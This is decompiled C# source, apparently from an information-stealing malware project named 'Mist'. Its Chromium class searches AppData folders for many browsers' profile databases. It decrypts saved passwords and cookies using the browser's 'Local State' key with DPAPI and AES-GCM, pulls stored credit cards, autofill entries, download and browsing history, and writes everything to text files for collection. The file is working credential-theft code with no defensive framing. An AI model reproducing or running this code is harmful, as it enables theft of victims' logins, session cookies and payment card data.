using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;

namespace Mist
{
	// Token: 0x0200000C RID: 12
	internal class Chromium
	{
		// Token: 0x06000027 RID: 39 RVA: 0x000065A0 File Offset: 0x000047A0
		public static void GetPasswordsOpera(string path2save)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Help.AppDate);
				list2.Add(Help.LocalData);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string[] array = null;
					string text2 = "";
					try
					{
						list.AddRange(Directory.GetFiles(text, "Login Data", SearchOption.AllDirectories));
						array = Directory.GetFiles(text, "Login Data", SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string text4 = "Unknown";
									foreach (string text5 in Chromium.BrowsersName)
									{
										if (text.Contains(text5))
										{
											text4 = text5;
										}
									}
									string sourceFileName = text3;
									string sourceFileName2 = text3 + "\\..\\Local State";
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									File.Copy(sourceFileName, Chromium.bd);
									File.Copy(sourceFileName2, Chromium.ls);
									SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
									new List<PassData>();
									sqlHandler.ReadTable("logins");
									string text6 = File.ReadAllText(Chromium.ls);
									string[] array4 = Regex.Split(text6, "\"");
									int num = 0;
									string[] array3 = array4;
									for (int j = 0; j < array3.Length; j++)
									{
										if (array3[j] == "encrypted_key")
										{
											text6 = array4[num + 2];
											break;
										}
										num++;
									}
									byte[] key = DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text6)).Remove(0, 5)), null);
									int rowCount = sqlHandler.GetRowCount();
									for (int k = 0; k < rowCount; k++)
									{
										try
										{
											string value = sqlHandler.GetValue(k, 5);
											byte[] bytes = Encoding.Default.GetBytes(value);
											string str = "";
											try
											{
												if (value.StartsWith("v10") || value.StartsWith("v11"))
												{
													byte[] iv = bytes.Skip(3).Take(12).ToArray<byte>();
													str = AesGcm256.Decrypt(bytes.Skip(15).ToArray<byte>(), key, iv);
												}
												else
												{
													str = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes, null));
												}
											}
											catch
											{
											}
											text2 = text2 + "Url: " + sqlHandler.GetValue(k, 1) + "\r\n";
											text2 = text2 + "Login: " + sqlHandler.GetValue(k, 3) + "\r\n";
											text2 = text2 + "Passwords: " + str + "\r\n";
											text2 = text2 + "Browser: " + text4 + "\r\n\r\n";
											Chromium.Passwords++;
										}
										catch
										{
										}
									}
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									if (text4 == "Unknown")
									{
										File.AppendAllText(path2save + "\\Passwords_" + text4 + ".txt", text2);
									}
									else
									{
										File.WriteAllText(path2save + "\\Passwords_" + text4 + ".txt", text2);
									}
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00006A28 File Offset: 0x00004C28
		public static void GetPasswords(string path2save)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Help.AppDate);
				list2.Add(Help.LocalData);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string[] array = null;
					string text2 = "";
					try
					{
						list.AddRange(Directory.GetFiles(text, "Login Data", SearchOption.AllDirectories));
						array = Directory.GetFiles(text, "Login Data", SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string text4 = "Unknown";
									foreach (string text5 in Chromium.BrowsersName)
									{
										if (text.Contains(text5))
										{
											text4 = text5;
										}
									}
									string sourceFileName = text3;
									string sourceFileName2 = text3 + "\\..\\..\\Local State";
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									File.Copy(sourceFileName, Chromium.bd);
									File.Copy(sourceFileName2, Chromium.ls);
									SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
									new List<PassData>();
									sqlHandler.ReadTable("logins");
									string text6 = File.ReadAllText(Chromium.ls);
									string[] array4 = Regex.Split(text6, "\"");
									int num = 0;
									string[] array3 = array4;
									for (int j = 0; j < array3.Length; j++)
									{
										if (array3[j] == "encrypted_key")
										{
											text6 = array4[num + 2];
											break;
										}
										num++;
									}
									byte[] key = DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text6)).Remove(0, 5)), null);
									int rowCount = sqlHandler.GetRowCount();
									for (int k = 0; k < rowCount; k++)
									{
										try
										{
											string value = sqlHandler.GetValue(k, 5);
											byte[] bytes = Encoding.Default.GetBytes(value);
											string str = "";
											try
											{
												if (value.StartsWith("v10") || value.StartsWith("v11"))
												{
													byte[] iv = bytes.Skip(3).Take(12).ToArray<byte>();
													str = AesGcm256.Decrypt(bytes.Skip(15).ToArray<byte>(), key, iv);
												}
												else
												{
													str = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes, null));
												}
											}
											catch
											{
											}
											text2 = text2 + "Url: " + sqlHandler.GetValue(k, 1) + "\r\n";
											text2 = text2 + "Login: " + sqlHandler.GetValue(k, 3) + "\r\n";
											text2 = text2 + "Passwords: " + str + "\r\n";
											text2 = text2 + "Browser: " + text4 + "\r\n\r\n";
											Chromium.Passwords++;
										}
										catch
										{
										}
									}
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									if (text4 == "Unknown")
									{
										File.AppendAllText(path2save + "\\Passwords_" + text4 + ".txt", text2);
									}
									else
									{
										File.WriteAllText(path2save + "\\Passwords_" + text4 + ".txt", text2);
									}
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00006EB0 File Offset: 0x000050B0
		public static void GetCookiesOpera(string path2save)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Help.AppDate);
				list2.Add(Help.LocalData);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string text2 = "";
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, "Cookies", SearchOption.AllDirectories));
						array = Directory.GetFiles(text, "Cookies", SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string text4 = "Unknown";
									foreach (string text5 in Chromium.BrowsersName)
									{
										if (text.Contains(text5))
										{
											text4 = text5;
										}
									}
									string sourceFileName = text3;
									string sourceFileName2 = text3 + "\\..\\Local State";
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									File.Copy(sourceFileName, Chromium.bd);
									File.Copy(sourceFileName2, Chromium.ls);
									SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
									new List<PassData>();
									sqlHandler.ReadTable("cookies");
									string text6 = File.ReadAllText(Chromium.ls);
									string[] array4 = Regex.Split(text6, "\"");
									int num = 0;
									string[] array3 = array4;
									for (int j = 0; j < array3.Length; j++)
									{
										if (array3[j] == "encrypted_key")
										{
											text6 = array4[num + 2];
											break;
										}
										num++;
									}
									byte[] key = DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text6)).Remove(0, 5)), null);
									int rowCount = sqlHandler.GetRowCount();
									for (int k = 0; k < rowCount; k++)
									{
										try
										{
											string value = sqlHandler.GetValue(k, 12);
											byte[] bytes = Encoding.Default.GetBytes(value);
											try
											{
												string text7;
												if (value.StartsWith("v10"))
												{
													byte[] iv = bytes.Skip(3).Take(12).ToArray<byte>();
													text7 = AesGcm256.Decrypt(bytes.Skip(15).ToArray<byte>(), key, iv);
												}
												else
												{
													text7 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes, null));
												}
												string value2 = sqlHandler.GetValue(k, 1);
												string value3 = sqlHandler.GetValue(k, 2);
												string value4 = sqlHandler.GetValue(k, 4);
												string value5 = sqlHandler.GetValue(k, 5);
												string value6 = sqlHandler.GetValue(k, 6);
												text2 += string.Format("{0}\tFALSE\t{1}\t{2}\t{3}\t{4}\t{5}\r\n", new object[]
												{
													value2,
													value4,
													value6.ToUpper(),
													value5,
													value3,
													text7
												});
												Chromium.Cookies++;
											}
											catch
											{
											}
										}
										catch
										{
										}
									}
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									if (text4 == "Unknown")
									{
										File.AppendAllText(path2save + "\\Cookies_" + text4 + ".txt", text2);
									}
									else
									{
										File.WriteAllText(path2save + "\\Cookies_" + text4 + ".txt", text2);
									}
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600002A RID: 42 RVA: 0x00007340 File Offset: 0x00005540
		public static void GetCookies(string path2save)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Help.AppDate);
				list2.Add(Help.LocalData);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string text2 = "";
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, "Cookies", SearchOption.AllDirectories));
						array = Directory.GetFiles(text, "Cookies", SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string text4 = "Unknown";
									foreach (string text5 in Chromium.BrowsersName)
									{
										if (text.Contains(text5))
										{
											text4 = text5;
										}
									}
									string sourceFileName = text3;
									string sourceFileName2 = text3 + "\\..\\..\\Local State";
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									File.Copy(sourceFileName, Chromium.bd);
									File.Copy(sourceFileName2, Chromium.ls);
									SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
									new List<PassData>();
									sqlHandler.ReadTable("cookies");
									string text6 = File.ReadAllText(Chromium.ls);
									string[] array4 = Regex.Split(text6, "\"");
									int num = 0;
									string[] array3 = array4;
									for (int j = 0; j < array3.Length; j++)
									{
										if (array3[j] == "encrypted_key")
										{
											text6 = array4[num + 2];
											break;
										}
										num++;
									}
									byte[] key = DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text6)).Remove(0, 5)), null);
									int rowCount = sqlHandler.GetRowCount();
									for (int k = 0; k < rowCount; k++)
									{
										try
										{
											string value = sqlHandler.GetValue(k, 12);
											byte[] bytes = Encoding.Default.GetBytes(value);
											try
											{
												string text7;
												if (value.StartsWith("v10"))
												{
													byte[] iv = bytes.Skip(3).Take(12).ToArray<byte>();
													text7 = AesGcm256.Decrypt(bytes.Skip(15).ToArray<byte>(), key, iv);
												}
												else
												{
													text7 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes, null));
												}
												string value2 = sqlHandler.GetValue(k, 1);
												string value3 = sqlHandler.GetValue(k, 2);
												string value4 = sqlHandler.GetValue(k, 4);
												string value5 = sqlHandler.GetValue(k, 5);
												string value6 = sqlHandler.GetValue(k, 6);
												text2 += string.Format("{0}\tFALSE\t{1}\t{2}\t{3}\t{4}\t{5}\r\n", new object[]
												{
													value2,
													value4,
													value6.ToUpper(),
													value5,
													value3,
													text7
												});
												Chromium.Cookies++;
											}
											catch
											{
											}
										}
										catch
										{
										}
									}
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									if (text4 == "Unknown")
									{
										File.AppendAllText(path2save + "\\Cookies_" + text4 + ".txt", text2);
									}
									else
									{
										File.WriteAllText(path2save + "\\Cookies_" + text4 + ".txt", text2);
									}
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600002B RID: 43 RVA: 0x000077D0 File Offset: 0x000059D0
		public static void GetCards(string path2save)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Help.AppDate);
				list2.Add(Help.LocalData);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string text2 = "";
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, "Web Data", SearchOption.AllDirectories));
						array = Directory.GetFiles(text, "Web Data", SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string text4 = "Unknown";
									foreach (string text5 in Chromium.BrowsersName)
									{
										if (text.Contains(text5))
										{
											text4 = text5;
										}
									}
									string sourceFileName = text3;
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									File.Copy(sourceFileName, Chromium.bd);
									SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
									new List<PassData>();
									sqlHandler.ReadTable("credit_cards");
									int rowCount = sqlHandler.GetRowCount();
									for (int k = 0; k < rowCount; k++)
									{
										try
										{
											string @string = Encoding.UTF8.GetString(DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(sqlHandler.GetValue(k, 4)), null));
											string value = sqlHandler.GetValue(k, 1);
											string value2 = sqlHandler.GetValue(k, 2);
											string value3 = sqlHandler.GetValue(k, 3);
											string value4 = sqlHandler.GetValue(k, 9);
											text2 += string.Format("{0}\t{1}/{2}\t{3}\t{4}\r\n******************************\r\n", new object[]
											{
												value,
												value2,
												value3,
												@string,
												value4
											});
											Chromium.CC++;
										}
										catch
										{
										}
									}
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									if (text4 == "Unknown")
									{
										File.AppendAllText(path2save + "\\Cards_" + text4 + ".txt", text2);
									}
									else
									{
										File.WriteAllText(path2save + "\\Cards_" + text4 + ".txt", text2);
									}
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00007B30 File Offset: 0x00005D30
		public static void GetAutofills(string path2save)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Help.AppDate);
				list2.Add(Help.LocalData);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string text2 = "";
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, "Web Data", SearchOption.AllDirectories));
						array = Directory.GetFiles(text, "Web Data", SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string text4 = "Unknown";
									foreach (string text5 in Chromium.BrowsersName)
									{
										if (text.Contains(text5))
										{
											text4 = text5;
										}
									}
									string sourceFileName = text3;
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									File.Copy(sourceFileName, Chromium.bd);
									SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
									new List<PassData>();
									sqlHandler.ReadTable("autofill");
									int rowCount = sqlHandler.GetRowCount();
									for (int k = 0; k < rowCount; k++)
									{
										try
										{
											string value = sqlHandler.GetValue(k, 0);
											string value2 = sqlHandler.GetValue(k, 1);
											text2 += string.Format("Name: {0}\r\nValue: {1}\r\n----------------------------\r\n", value, value2);
											Chromium.Autofills++;
										}
										catch
										{
										}
									}
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									if (text4 == "Unknown")
									{
										File.AppendAllText(path2save + "\\Autofills_" + text4 + ".txt", text2);
									}
									else
									{
										File.WriteAllText(path2save + "\\Autofills_" + text4 + ".txt", text2);
									}
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00007E30 File Offset: 0x00006030
		public static void GetDownloads(string path2save)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Help.AppDate);
				list2.Add(Help.LocalData);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, "History", SearchOption.AllDirectories));
						array = Directory.GetFiles(text, "History", SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text2 in array)
						{
							string text3 = "";
							try
							{
								if (File.Exists(text2))
								{
									string str = "Unknown (" + text + ")";
									foreach (string text4 in Chromium.BrowsersName)
									{
										if (text.Contains(text4))
										{
											str = text4;
										}
									}
									string sourceFileName = text2;
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									File.Copy(sourceFileName, Chromium.bd);
									SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
									new List<PassData>();
									sqlHandler.ReadTable("downloads");
									int rowCount = sqlHandler.GetRowCount();
									for (int k = 0; k < rowCount; k++)
									{
										try
										{
											string value = sqlHandler.GetValue(k, 3);
											string value2 = sqlHandler.GetValue(k, 15);
											text3 += string.Format("URL: {0}\r\nPath: {1}\r\n----------------------------\r\n", value2, value);
											Chromium.Downloads++;
										}
										catch
										{
										}
									}
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									File.WriteAllText(path2save + "\\Downloads_" + str + ".txt", text3);
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00008114 File Offset: 0x00006314
		public static void GetHistory(string path2save)
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Help.AppDate);
				list2.Add(Help.LocalData);
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string text in list3)
				{
					string text2 = "";
					string[] array = null;
					try
					{
						list.AddRange(Directory.GetFiles(text, "History", SearchOption.AllDirectories));
						array = Directory.GetFiles(text, "History", SearchOption.AllDirectories);
					}
					catch
					{
					}
					if (array != null)
					{
						foreach (string text3 in array)
						{
							try
							{
								if (File.Exists(text3))
								{
									string text4 = "Unknown";
									foreach (string text5 in Chromium.BrowsersName)
									{
										if (text.Contains(text5))
										{
											text4 = text5;
										}
									}
									string sourceFileName = text3;
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									File.Copy(sourceFileName, Chromium.bd);
									SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
									new List<PassData>();
									sqlHandler.ReadTable("urls");
									int rowCount = sqlHandler.GetRowCount();
									for (int k = 0; k < rowCount; k++)
									{
										try
										{
											string value = sqlHandler.GetValue(k, 1);
											string value2 = sqlHandler.GetValue(k, 2);
											text2 += string.Format("\r\nTitle: {0}\r\nUrl: {1}", value2, value);
											Chromium.History++;
										}
										catch
										{
										}
									}
									if (File.Exists(Chromium.bd))
									{
										File.Delete(Chromium.bd);
									}
									if (File.Exists(Chromium.ls))
									{
										File.Delete(Chromium.ls);
									}
									if (text4 == "Unknown")
									{
										File.AppendAllText(path2save + "\\History_" + text4 + ".txt", text2, Encoding.Default);
									}
									else
									{
										File.WriteAllText(path2save + "\\History_" + text4 + ".txt", text2, Encoding.Default);
									}
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400002A RID: 42
		public static int Passwords = 0;

		// Token: 0x0400002B RID: 43
		public static int Autofills = 0;

		// Token: 0x0400002C RID: 44
		public static int Downloads = 0;

		// Token: 0x0400002D RID: 45
		public static int Cookies = 0;

		// Token: 0x0400002E RID: 46
		public static int History = 0;

		// Token: 0x0400002F RID: 47
		public static int CC = 0;

		// Token: 0x04000030 RID: 48
		public static string bd = Path.GetTempPath() + "\\bd" + Help.HWID + ".tmp";

		// Token: 0x04000031 RID: 49
		public static string ls = Path.GetTempPath() + "\\ls" + Help.HWID + ".tmp";

		// Token: 0x04000032 RID: 50
		private static readonly string[] BrowsersName = new string[]
		{
			"Chrome",
			"Edge",
			"Yandex",
			"Orbitum",
			"Opera",
			"Amigo",
			"Torch",
			"Comodo",
			"CentBrowser",
			"Go!",
			"uCozMedia",
			"Rockmelt",
			"Sleipnir",
			"SRWare Iron",
			"Vivaldi",
			"Sputnik",
			"Maxthon",
			"AcWebBrowser",
			"Epic Browser",
			"MapleStudio",
			"BlackHawk",
			"Flock",
			"CoolNovo",
			"Baidu Spark",
			"Titan Browser",
			"Google",
			"browser"
		};
	}
}
